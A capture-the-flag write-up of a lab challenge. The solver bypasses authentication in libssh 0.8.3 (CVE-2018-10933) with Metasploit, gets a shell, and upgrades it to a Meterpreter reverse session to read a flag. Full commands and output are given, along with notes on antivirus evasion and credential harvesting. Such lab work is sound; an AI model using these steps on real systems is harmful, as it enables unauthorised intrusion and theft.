#  📌 Challenge Overview

| 🧩 Platform & Name | Challenginno/vulnerable-ssh-service |
| ------------------- | ------------------------------- |
| 📅 Date             | 2026-11-17 |
| 👾 Solver           | ph4tn01 |
| 🔰 Category         | Network |
| ⭐ Difficulty        | Medium |
| 🎯 Points           | 5 |

---

# 📋 Initial Info:

 One of the methods for accessing a system, or Initial Access, is exploiting common vulnerabilities.
 In this challenge, an SSH service that has a vulnerability has been provided.
 Using this vulnerability, gain Shell access and find the flag.txt file.

---

# 🔍 Initial Analysis:

 - First i ran `netdiscover -r 192.168.215.0/24` to find its IP
 - After Finiding its IP i ran `nmap 192.168.215.133` and saw port 22 was open so i ran `nmap 192.168.215.133 -p 22 -sV` and saw that it was running OpenSSH 9.1; so i go into the rabbit hole of trying to exploit this ssh service using CVE-2024-6387 only to findout later port 22 was just a distraction :)
 - After attempting to exploit this fake ssh service a bunch of times and failing repeatedly, i had the thought of maybe the vulnrable ssh is on another port so i ran nmapagain:
 ```sh
 └─$ nmap -p- -sS -sV -T5 192.168.215.133
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-17 16:38 EST
 Nmap scan report for 192.168.215.133
 Host is up (0.00064s latency).
 Not shown: 65533 filtered tcp ports (no-response)
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 9.1 (protocol 2.0)
 2223/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
 MAC Address: 00:00:00:00:00:00 (VMware)
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 68.45 seconds
 ```
 - Side-Note: This nmap command i did is very aggresive and noisy (because of the -T5 flag), so if you think you are going to be blocked by the firewall, you can also do `nmap -p- 192.168.215.133` instead, it's a bit slower but safer
 - So i saw th real vulnerable SSH service running at 2223 with the very old version of libssh 0.8.3; now we got to exploit this

---

# 🔓 Solving

 - So first i searched for "libSSH 0.8.3 Exploit" in google and went to the first article which was very helful [https://ine.com/blog/libssh-auth-bypass-cve-2018-10933]
 - The vulnerability (CVE-2018-10933) allows an attacker to bypass authentication by sending a USERAUTH_SUCCESS message prematurely.
 - I ran metasploit `msfconsole` and i searched for the CVE `search libssh`
 ```sh
 Matching Modules
 ================
    #  Name                                      Disclosure Date  Rank    Check  Description
    -  ----                                      ---------------  ----    -----  -----------
    0  auxiliary/scanner/ssh/libssh_auth_bypass  2018-10-16       normal  No     libssh Authentication Bypass Scanner
    1    \_ action: Execute                      .                .       .      Execute a command
    2    \_ action: Shell                        .                .       .      Spawn a shell
 Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/ssh/libssh_auth_bypass
 After interacting with a module you can manually set a ACTION with set ACTION 'Shell'
 ```
 - The libssh_auth_bypass module is technically an auxiliary module because it doesn't automatically run a standard Metasploit payload to establish a session; it "manually" spawns a shell through the authentication bypass
 - Auxiliary vs. Exploit: An exploit module is designed to leverage a vulnerability and deliver a payload (like a reverse shell or Meterpreter) to execute arbitrary code on the target. An auxiliary module, as noted, does not run a payload by default
 - i selceted it `use auxiliary/scanner/ssh/libssh_auth_bypass` and ran `show options` to see the configurations needed to be done before running the exploit
 ```sh
 msf auxiliary(scanner/ssh/libssh_auth_bypass) > show options
 Module options (auxiliary/scanner/ssh/libssh_auth_bypass):
    Name           Current Setting  Required  Description
    ----           ---------------  --------  -----------
    CHECK_BANNER   true             no        Check banner for libssh
    CMD                             no        Command or alternative shell
    CreateSession  true             no        Create a new session for every successful login
    RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
    RPORT          22               yes       The target port
    SPAWN_PTY      false            no        Spawn a PTY
    THREADS        1                yes       The number of concurrent threads (max one per host)
 Auxiliary action:
    Name   Description
    ----   -----------
    Shell  Spawn a shell
 ```
 - Here we should set the options `RHOSTS`, `RPORT` and `SPAWN_PTY`
 - When exploiting CVE-2018-10933 with the libssh_auth_bypass module, setting SPAWN_PTY to true is a critical step to obtain a functional shell because The authentication bypass alone only puts the session in an "authenticated" state. If you leave SPAWN_PTY at its default false, the exploit often opens a session that immediately closes or is invalid because the remote service is not prepared to handle a shell without a terminal attached. Setting it to true sends a request to the target to allocate a pseudo-terminal (PTY) for the session. This provides the server with the necessary signal to initialize a proper shell process, resulting in a stable and usable interactive session
 - After setting the options, we ran the exploit
 ```sh
 msf auxiliary(scanner/ssh/libssh_auth_bypass) > set RHOSTS 192.168.215.133
 RHOSTS => 192.168.215.133
 msf auxiliary(scanner/ssh/libssh_auth_bypass) > set RPORT 2223
 RPORT => 2223
 msf auxiliary(scanner/ssh/libssh_auth_bypass) > set SPAWN_PTY true
 SPAWN_PTY => true
 msf auxiliary(scanner/ssh/libssh_auth_bypass) > exploit
 [*] 192.168.215.133:2223 - Attempting authentication bypass
 [*] Attempting "Shell" Action, see "show actions" for more details
 [*] Command shell session 1 opened (192.168.215.131:40189 -> 192.168.215.133:2223) at 2026-11-17 16:51:34 -0500
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
 - after that i ran `sessions` to see if the exploit was successful and if any seesion is created
 ```sh
 msf auxiliary(scanner/ssh/libssh_auth_bypass) > sessions
 Active sessions
 ===============
   Id  Name  Type   Information                                                  Connection
   --  ----  ----   -----------                                                  ----------
   1         shell  libssh Authentication Bypass Scanner (SSH-2.0-libssh_0.8.3)  192.168.215.131:40189 -> 192.168.215.133:2223 (192.168.215.133)
 ```
 - So now we either can connect to this session directly by running `sessions -i 1` and get a standard shell access
 - Or optionaly we can do some "Post-Exploitation" tricks and first upgrade our session into a more capable shell via Meterpreter by running `sessions -u 1`(which is not needed for this challenge)
 - The command `sessions -u 1` is a Metasploit automation shortcut. It tells the framework to take your existing, basic shell session (ID 1) and run the post/multi/manage/shell_to_meterpreter module against it. This process "upgrades" the session by injecting a more advanced Meterpreter payload into the target, ultimately providing you with a much more capable session.
 ```sh
 msf auxiliary(scanner/ssh/libssh_auth_bypass) > sessions -u 1
 [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
 [!] SESSION may not be compatible with this module:
 [!]  * Unknown session platform. This module works with: Linux, OSX, Unix, Solaris, BSD, Windows.
 [*] Upgrading session ID: 1
 [*] Starting exploit/multi/handler
 [*] Started reverse TCP handler on 192.168.215.131:4433
 [*] Sending stage (1062760 bytes) to 192.168.215.133
 [*] Meterpreter session 2 opened (192.168.215.131:4433 -> 192.168.215.133:50626) at 2026-11-17 16:52:42 -0500
 [*] Command stager progress: 100.00% (773/773 bytes)
 msf auxiliary(scanner/ssh/libssh_auth_bypass) > sessions
 Active sessions
 ===============
   Id  Name  Type                   Information                                                 Connection
   --  ----  ----                   -----------                                                 ----------
   1         shell                  libssh Authentication Bypass Scanner (SSH-2.0-libssh_0.8.3  192.168.215.131:40189 -> 192.168.215.133:2223 (192.168.215.
                                    )                                                           133)
   2         meterpreter x86/linux  root @ 172.17.0.2                                           192.168.215.131:4433 -> 192.168.215.133:50626 (172.17.0.2)
 msf auxiliary(scanner/ssh/libssh_auth_bypass) > sessions -i 2
 [*] Starting interaction with 2...
 meterpreter > ls
 Listing: /root
 ==============
 Mode              Size  Type  Last modified              Name
 ----              ----  ----  -------------              ----
 100644/rw-r--r--  3106  fil   2018-04-09 07:10:28 -0400  .bashrc
 100644/rw-r--r--  28    fil   2024-03-08 15:56:19 -0500  .flag.txt
 100644/rw-r--r--  148   fil   2015-08-17 11:30:33 -0400  .profile
 100600/rw-------  740   fil   2024-03-08 15:56:19 -0500  .viminfo
 040755/rwxr-xr-x  4096  dir   2020-09-17 15:27:20 -0400  cve
 100600/rw-------  668   fil   2020-09-17 15:27:48 -0400  ssh_host_dsa_key
 100644/rw-r--r--  610   fil   2020-09-17 15:27:48 -0400  ssh_host_dsa_key.pub
 100600/rw-------  1675  fil   2020-09-17 15:27:49 -0400  ssh_host_rsa_key
 100644/rw-r--r--  402   fil   2020-09-17 15:27:49 -0400  ssh_host_rsa_key.pub
 meterpreter > cat .flag.txt
 xxx-xxxx-xxxxx-xxxxxxxxxxxx
 ```
 - Meterpreter is not an exploit; it is a payload. It is a highly advanced, dynamically extensible payload that is delivered after a vulnerability has been successfully exploited; It operates almost entirely in memory using a technique called Reflective DLL Injection (RDI). This means it does not write itself to the target's disk, making it stealthier and harder for traditional antivirus software to detect.
 - Does it always work? No. Meterpreter is not guaranteed to work on every system. Its success depends on the target's architecture, operating system, and security controls. the shell_to_meterpreter upgrade process itself may fail on hardened or minimal systems. If a system is sufficiently locked down (e.g., application allow-listing, strict memory protections), the payload may be blocked or unable to execute.
 - Why Use Meterpreter? While a standard shell (sessions -i 1) provides basic command execution, upgrading to a Meterpreter session offers significant tactical advantages for post-exploitation:
     - In-Memory Stealth: Operates entirely in memory (reflective DLL injection) rather than writing to disk, making it much harder for antivirus and forensic tools to detect.
     - Rich Built-in Toolkit: Replaces reliance on native OS commands with powerful built-in tools (e.g., `sysinfo` for enumeration, `hashdump` for credential harvesting, `getsystem` for privilege escalation and etc...).
     - Seamless File Transfer: Includes native `upload` and `download` commands, eliminating the need to use target-native tools like wget or curl.
     - Network Pivoting: Features a built-in `portfwd` command to easily route traffic through the compromised host into internal networks.
     - Process Migration: Allows you to migrate the session into another running process. This is crucial for stabilizing the connection (if the original process crashes) or evading detection by blending in with legitimate applications.
     - Streamlined Post-Exploitation: Acts as a direct bridge to Metasploit’s extensive library of post-exploitation modules, allowing you to run advanced attacks directly from the session.

---

# 📚 Takeaways

 - Always checkout all the ports on a target via the `-p-` flag of nmap
 - Port 22 maybe a trap, don't spend hours on it :)

---
